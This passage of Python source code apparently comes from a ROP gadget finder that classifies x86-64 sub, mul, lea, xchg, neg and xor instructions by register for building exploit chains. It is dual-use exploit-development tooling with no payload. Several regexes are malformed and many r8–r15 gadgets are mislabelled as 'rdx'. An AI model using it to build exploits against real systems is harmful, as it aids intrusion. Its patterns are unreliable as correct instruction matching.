				elif re.match( r'^[sub|sbb]+ r15[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subR15)		
			else:
				# Sub dword
				if re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*[er]*a[x|l|h]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.subQwordRAX)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*[er]*b[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.subQwordRBX)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*[er]*c[x|l|h]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.subQwordRCX)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*[er]*d[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subQwordRDX)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*[er]*si', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.subQwordRSI)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*[er]*di', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.subQwordRDI)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*[er]*sp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.subQwordRSP)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*[er]*bp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.subQwordRBP)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*r8[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subQwordR8)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*r9[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subQwordR9)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*r10[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subQwordR10)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*r11[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subQwordR11)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*r12[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subQwordR12)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*r13[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subQwordR13)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*r14[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subQwordR14)
				elif re.match( r'^[sub|sbb]+ [dword|qword|byte|word]* [ptr]* [\[]*r15[bdw]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.subQwordR15)		
				if "gs:[r" in testVal or "gs:[0xc0]"  in testVal:
					if re.match( r'^[sub|sbb]+ [er]*[abcdsibpbx]+, [qword|dword]+ ptr gs', testVal, re.M|re.I):
						addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.subGS)

	def do64_sbb(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_sub(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do64_mul(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.mul)
		if not re.match( r'^imul', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.mulRAX)
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulRDX)
		if re.match( r'^imul[b|w|l]* [er]*ax,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.mulRAX)
		elif re.match( r'^imul[b|w|l]* [er]*bx,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.mulRBX)
		elif re.match( r'^imul[b|w|l]* [er]*cx,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.mulRCX)
		elif re.match( r'^imul[b|w|l]* [er]*dx,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulRDX)
		elif re.match( r'^imul[b|w|l]* [er]*si,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.mulRSI)
		elif re.match( r'^imul[b|w|l]* [er]*di, ', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.mulRDI)
		elif re.match( r'^imul[b|w|l]* [er]*sp, ', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.mulRSP)
		elif re.match( r'^imul[b|w|l]* [er]*bp, ', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.mulRBP)
		elif re.match( r'^imul[b|w|l]* r8[bdw]*', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulR8)
		elif re.match( r'^imul[b|w|l]* r9[bdw]*', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulR9)
		elif re.match( r'^imul[b|w|l]* r10[bdw]*', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulR10)
		elif re.match( r'^imul[b|w|l]* r11[bdw]*', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulR11)
		elif re.match( r'^imul[b|w|l]* r12[bdw]*', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulR12)
		elif re.match( r'^imul[b|w|l]* r13[bdw]*', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulR13)
		elif re.match( r'^imul[b|w|l]* r14[bdw]*', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulR14)
		elif re.match( r'^imul[b|w|l]* r15[bdw]*', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.mulR15)		

	def do64_imul(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_mul(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do64_div(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.div)
		if re.match( r'\bdiv\b|\bdivb\b|\bdivw\b|\bdivl\b|\bdivwl|\bdivbwl\b|\bidiv\b|\bidivb\b|\bidivw\b|\bidivl\b|\bidivwl|\bidivbwl\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.divRAX)
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.divRDX)

	def do64_idiv(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do64_div(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do64_lea(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.lea)
		if re.match( r'^lea [er]*a[x|l|h]+|^lea [dword|qword|byte|word]+ ptr \[[er]*a[x|l|h]', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.leaRAX)
		elif re.match( r'^lea [er]*b[x|l|h]+|^lea [dword|qword|byte|word]+ ptr \[[er]*b[x|l|h]', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.leaRBX)
		elif re.match( r'^lea [er]*c[x|l|h]+|^lea [dword|qword|byte|word]+ ptr \[[er]*c[x|l|h]', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.leaRCX)
		elif re.match( r'^lea [er]*d[x|l|h]+|^lea [dword|qword|byte|word]+ ptr \[[er]*d[x|l|h]', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.leaRDX)
		elif re.match( r'^lea [er]*si|^lea [dword|qword|byte|word]+ ptr \[[er]*si', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.leaRSI)
		elif re.match( r'^lea [er]*di|^lea [dword|qword|byte|word]+ ptr \[[er]*di', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.leaRDI)
		elif re.match( r'^lea [er]*bp|^lea [dword|qword|byte|word]+ ptr \[[er]*bp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.leaRBP)
		elif re.match( r'^lea [er]*sp|^lea [dword|qword|byte|word]+ ptr \[[er]*sp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.leaRSP)
		elif re.match( r'^lea r8 |lea [dword|qword|byte|word]+ ptr \[r8 ', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r8", fg.leaR8)
		elif re.match( r'^lea r9 |lea [dword|qword|byte|word]+ ptr \[r9 ', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r9", fg.leaR9)
		elif re.match( r'^lea r10|lea [dword|qword|byte|word]+ ptr \[r10', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r10", fg.leaR10)
		elif re.match( r'^lea r11|lea [dword|qword|byte|word]+ ptr \[r11', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r11", fg.leaR11)
		elif re.match( r'^lea r12|lea [dword|qword|byte|word]+ ptr \[r12', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r12", fg.leaR12)
		elif re.match( r'^lea r13|lea [dword|qword|byte|word]+ ptr \[r13', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r13", fg.leaR13)
		elif re.match( r'^lea r14|lea [dword|qword|byte|word]+ ptr \[r14', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r14", fg.leaR14)
		elif re.match( r'^lea r15|lea [dword|qword|byte|word]+ ptr \[r15', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r15", fg.leaR15)	

	def do64_xchg(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.xchg64)
		if not re.match( r'^xchg [er]+ax, [er]+ax|^xchg [er]+bx, [er]+bx|^xchg [er]+cx, [er]+cx|^xchg [er]+dx, [er]+dx|^xchg [er]+si, [er]+si|^xchg [er]+di, [er]+di|^xchg [er]+sp, [er]+sp|^xchg [er]+bp, [er]+bp|^xchg ax, ax|^xchg bx, bx|^xchg cx, cx|^xchg dx, dx|^xchg si, si|^xchg di, di|^xchg sp, sp|^xchg bp, bp|^xchg al, al|^xchg bl, bl|^xchg cl, cl|^xchg dl, dl|xchg r8, r8|xchg r9, r9|xchg r10, r10|xchg r11, r11|xchg r12, r12|xchg r13, r13|xchg r14, r14|xchg r15, r15', testVal, re.M|re.I):
			if re.match( r'^xchg [er]+ax, |^xchg [erabcdsbp189012345]+[xspi]*, [er]+ax', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.xchgRAX)
			if re.match( r'^xchg [er]+bx, |^xchg [erabcdsbp189012345]+[xspi]*, [er]+bx', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.xchgRBX)
			if re.match( r'^xchg [er]+cx, |^xchg [erabcdsbp189012345]+[xspi]*, [er]+cx', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.xchgRCX)
			if re.match( r'^xchg [er]+dx, |^xchg [erabcdsbp189012345]+[xspi]*, [er]+dx', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xchgRDX)
			if re.match( r'^xchg [er]+si, |^xchg [erabcdsbp189012345]+[xspi]*, [er]+si', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.xchgRSI)
			if re.match( r'^xchg [er]+di, |^xchg [erabcdsbp189012345]+[xspi]*, [er]+di', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.xchgRDI)
			if re.match( r'^xchg [er]+bp, |^xchg [erabcdsbp189012345]+[xspi]*, [er]+bp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.xchgRBP)
			if re.match( r'^xchg [er]+sp, |^xchg [erabcdsbp189012345]+[xspi]*, [er]+sp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.xchgRSP)
			if "gs:[r" in testVal or "gs:[0xc0]"  in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgGS)
			if re.match( r'^xchg r8|xchg [erabcdsbp189012345]+[xspi]*, r8' , testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xchgR8)
			if re.match( r'^xchg r9|xchg [erabcdsbp189012345]+[xspi]*, r9' , testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xchgR9)
			if re.match( r'^xchg r10|xchg [erabcdsbp189012345]+[xspi]*, r10 ', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xchgR10)
			if re.match( r'^xchg r11|xchg [erabcdsbp189012345]+[xspi]*, r11 ', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xchgR11)
			if re.match( r'^xchg r12|xchg [erabcdsbp189012345]+[xspi]*, r12 ', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xchgR12)
			if re.match( r'^xchg r13|xchg [erabcdsbp189012345]+[xspi]*, r13 ', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xchgR13)
			if re.match( r'^xchg r14|xchg [erabcdsbp189012345]+[xspi]*, r14 ', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xchgR14)
			if re.match( r'^xchg r15|xchg [erabcdsbp189012345]+[xspi]*, r15 ', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xchgR15)	

	def do64_neg(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.neg)
		if re.match( r'^neg [er]*a[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.negRAX)
		elif re.match( r'^neg [er]*b[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.negRBX)
		elif re.match( r'^neg [er]*c[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.negRCX)
		elif re.match( r'^neg [er]*d[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.negRDX)
		elif re.match( r'^neg [er]*si', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.negRSI)
		elif re.match( r'^neg [er]*di', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.negRDI)
		elif re.match( r'neg [er]*sp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.negRSP)
		elif re.match( r'^neg [er]*bp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.negRBP)
		elif re.match( r'^neg r8', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.negR8)
		elif re.match( r'^neg r9', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.negR9)
		elif re.match( r'^neg r10', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.negR10)
		elif re.match( r'^neg r11', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.negR11)
		elif re.match( r'^neg r12', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.negR12)
		elif re.match( r'^neg r13', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.negR13)
		elif re.match( r'^neg r14', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.negR14)
		elif re.match( r'^neg r15', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.negR15)	

	def do64_xor(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.xor)
		if "ptr" not in testVal:
			if re.match( r'^xor [er]*a[x|l|h]+', testVal, re.M|re.I):
				if re.match( r'^xor eax, eax', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.xorZeroRAX)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.xorRAX)
			elif re.match( r'^xor [er]*b[x|l|h]+', testVal, re.M|re.I):
				if re.match( r'^xor ebx, ebx', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.xorZeroRBX)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.xorRBX)
			elif re.match( r'^xor [er]*c[x|l|h]+', testVal, re.M|re.I):
				if re.match( r'^xor ecx, ecx', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.xorZeroRCX)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.xorRCX)
			elif re.match( r'^xor [er]*d[x|l|h]+', testVal, re.M|re.I):
				if re.match( r'^xor edx, edx', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorZeroRDX)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorRDX)
			elif re.match( r'^xor [er]*si', testVal, re.M|re.I):
				if re.match( r'^xor esi, esi', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.xorZeroRSI)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.xorRSI)
			elif re.match( r'^xor [er]*di', testVal, re.M|re.I):
				if re.match( r'^xor edi, edi', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.xorZeroRDI)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.xorRDI)
			elif re.match( r'^xor [er]*sp', testVal, re.M|re.I):
				if re.match( r'^xor esp, esp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.xorZeroRSP)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.xorRSP)
			elif re.match( r'^xor [er]*bp', testVal, re.M|re.I):
				if re.match( r'^xor ebp, ebp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.xorZeroRBP)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.xorRBP)
			elif re.match( r'^xor r8', testVal, re.M|re.I):
				if re.match( r'^xor r8, r8', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r8", fg.xorZeroR8)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r8", fg.xorR8)
			elif re.match( r'^xor r9', testVal, re.M|re.I):
				if re.match( r'^xor r9, r9', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r9", fg.xorZeroR9)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r9", fg.xorR9)
			elif re.match( r'^xor r10', testVal, re.M|re.I):
				if re.match( r'^xor r10, r10', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r10", fg.xorZeroR10)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r10", fg.xorR10)
			elif re.match( r'^xor r11', testVal, re.M|re.I):
				if re.match( r'^xor r11, r11', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r11", fg.xorZeroR11)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r11", fg.xorR11)
			elif re.match( r'^xor r12', testVal, re.M|re.I):
				if re.match( r'^xor r12, r12', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r12", fg.xorZeroR12)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r12", fg.xorR12)
			elif re.match( r'^xor r13', testVal, re.M|re.I):
				if re.match( r'^xor r13, r13', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r13", fg.xorZeroR13)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r13", fg.xorR13)
			elif re.match( r'^xor r14', testVal, re.M|re.I):
				if re.match( r'^xor r14, r14', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r14", fg.xorZeroR14)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r14", fg.xorR14)
			elif re.match( r'^xor r15', testVal, re.M|re.I):
				if re.match( r'^xor r15, r15', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r15", fg.xorZeroR15)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r15", fg.xorR15)
		else:
			if re.match( r'^xor [qword|dword]+ ptr \[[er]*a[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.xorQwordRAX)
			elif re.match( r'^xor [qword|dword]+ ptr \[[er]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.xorQwordRBX)
			elif re.match( r'^xor [qword|dword]+ ptr \[[er]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.xorQwordRCX)
			elif re.match( r'^xor [qword|dword]+ ptr \[[er]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorQwordRDX)
			elif re.match( r'^xor [qword|dword]+ ptr \[[er]*si', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.xorQwordRSI)
			elif re.match( r'^xor [qword|dword]+ ptr \[[er]*di', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.xorQwordRDI)
			elif re.match( r'^xor [qword|dword]+ ptr \[[er]*sp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.xorQwordRSP)
			elif re.match( r'^xor [qword|dword]+ ptr \[[er]*bp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.xorQwordRBP)
			elif re.match( r'^xor [qword|dword]+ ptr \[r8', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorR8)
			elif re.match( r'^xor [qword|dword]+ ptr \[r9', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorR9)
			elif re.match( r'^xor [qword|dword]+ ptr \[r10', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorR10)
			elif re.match( r'^xor [qword|dword]+ ptr \[r11', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorR11)
			elif re.match( r'^xor [qword|dword]+ ptr \[r12', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorR12)
			elif re.match( r'^xor [qword|dword]+ ptr \[r13', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorR13)
			elif re.match( r'^xor [qword|dword]+ ptr \[r14', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorR14)
			elif re.match( r'^xor [qword|dword]+ ptr \[r15', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.xorR15)	
			if "gs:[e" in testVal or "gs:[0xc0]"  in testVal:
				if re.match( r'^xor [er]*[abcdsibpbx189012345]+, [qword|dword]+ ptr gs', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.xorGS)
	
	def do64_mov(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if re.match( r'^mov [er]*[abcds89012345]+[xlspbi]+, [er]*[abcdspb01234589]+[x|l|h|i|p]*', testVal, re.M|re.I):
